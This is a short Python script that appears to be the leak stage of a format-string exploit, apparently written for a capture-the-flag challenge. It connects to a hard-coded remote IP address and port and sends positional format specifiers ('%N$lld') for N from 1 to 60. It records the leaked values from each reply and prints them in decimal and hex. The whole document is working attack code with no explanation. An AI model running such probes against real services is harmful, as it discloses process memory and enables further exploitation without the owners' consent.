#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
leaks={}
for n in range(1, 61):
    s.send(("%%%d$lld\n" % n).encode())
    time.sleep(0.08)
    try:
        d=s.recv(4096)
    except Exception:
        d=b'<TIMEOUT>'
    m=re.search(rb'([0-9-]+)\n', d)
    if m:
        leaks[n]=int(m.group(1))
    else:
        leaks[n]=('RAW', d)
s.close()
for n in range(1,61):
    v=leaks[n]
    if isinstance(v,tuple):
        print(f"{n}: RAW {v[1]!r}")
    else:
        print(f"{n}: {v}  0x{v & ((1<<64)-1):x}")
